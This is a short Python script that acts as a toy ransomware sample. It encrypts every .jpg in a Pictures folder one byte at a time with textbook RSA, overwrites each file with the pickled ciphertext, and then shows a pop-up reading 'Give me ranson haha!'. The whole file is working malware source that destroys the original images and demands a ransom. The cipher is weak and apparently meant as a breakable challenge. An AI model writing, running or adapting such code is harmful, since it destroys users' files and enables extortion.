import os
import pickle

filepath = os.path.dirname(os.path.realpath(__file__))
directory = filepath + "/Pictures/"

e = 65535
n = 22291846172619859445381409012451

for filename in os.listdir(directory):
    if filename.endswith(".jpg"):
        file = directory + filename
        plain_bytes = b''
        with open(file, 'rb') as f:
            plain_bytes = f.read()
        cipher_int = [pow(i, e, n) for i in plain_bytes]
        with open(file, 'wb') as f:
            pickle.dump(cipher_int, f)

os.system("zenity --error --text=\"{}\" --title=\"{}\"".format("Give me ranson haha!", "Error!"))